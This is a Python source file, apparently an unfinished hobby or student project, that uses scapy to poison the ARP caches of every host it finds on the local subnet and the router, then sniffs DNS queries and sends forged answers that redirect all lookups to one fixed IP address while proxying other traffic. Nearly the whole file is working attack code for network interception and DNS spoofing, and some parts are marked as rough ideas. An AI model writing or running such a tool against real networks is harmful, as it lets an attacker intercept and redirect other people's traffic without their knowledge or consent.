import scapy.all as scapy
import threading
import arp_spoofing

destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)


dns_looping = True #set this to false to stop the thread

#if packet is dns and has qr=0, it is a query
def isDnsQuery(packet):
    return packet.haslayer(scapy.DNS) and packet.getlayer(scapy.DNS).qr == 0

#all non dns packets need to be proxied, else the arp poisoning cuts them off the internet
def proxy(packet):
    # set packet hwdst to mac corresponding to the ip destination
    packet[scapy.Ether].dst = victim_addresses[packet[scapy.IP].dst]
    scapy.sendp(packet)

#todo fix this, is just an idea
def dns_spoof(packet):
    if not isDnsQuery(packet):
        proxy(packet)
        return
    print("dns lookup packet detected")

    qname = packet[scapy.DNSQR].qname.decode('utf-8') #get the domain name client wants to resolve

    ip_src = packet[scapy.IP].src
    ip_dst = packet[scapy.IP].dst
    udp_sport = packet[scapy.UDP].sport
    udp_dport = packet[scapy.UDP].dport
    dns_id = packet[scapy.DNS].id
    dns_qd = packet[scapy.DNS].qd
        
    #dns record with the destination ip as resolved ip
    dns_rr = scapy.DNSRR(rrname=qname, ttl=10, rdata=destination_ip) #maybe different ip
    

    spoofed_response = scapy.IP(dst=ip_src, src=ip_dst) / \
                       scapy.UDP(dport=udp_sport, sport=udp_dport) / \
                       scapy.DNS(id=dns_id, qr=1, aa=1, qd=dns_qd, an=dns_rr)

    scapy.sendp(spoofed_response)

def dns_main_loop():
    while dns_looping:
        #continuously sniff and respond to dns packets (udp port 53 is used for dns)
        arp_tick()
        scapy.sniff(filter="udp port 53", prn=dns_spoof, timeout = 5)
    

def dns_main():
    #on a thread we sniff for dns packets and respond with a spoofed response
    arp_prep_automated()
    #dns_spoofing_thread = threading.Thread(target=dns_main_loop)
    #dns_spoofing_thread.start()
    dns_main_loop()








#Not supposed to be here, we should move later

victim_addresses = {}
router_ip = None
sent_packets_count = 0
current_ip = None
iface = None
our_mac = None

def arp_prep_automated(silent = False, iface_ = "enp0s10") :
    global victim_addresses, router_ip, iface, sent_packets_count, current_ip

    iface = iface_
    current_ip = scapy.get_if_addr(iface_)
    
    subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
    router_ip = subnet + '.1' #usually router is at subnet .1

    for i in range(1,255) :  # ips in subnet
        ip = subnet + "." + str(i)
        try :
            victim_addresses[ip] = arp_spoofing.get_mac(ip) #exists
        except :
            pass #does not exist

    if current_ip in victim_addresses:
        del victim_addresses[current_ip]
    
    
    print("Victims: ", str(victim_addresses))

def arp_tick():
    for victim_ip, victim_mac in victim_addresses.items():
            arp_spoofing.arp_spoof(victim_ip, router_ip) #send to victim that we are router
            arp_spoofing.arp_spoof(router_ip, victim_ip) #send to router that we are victim
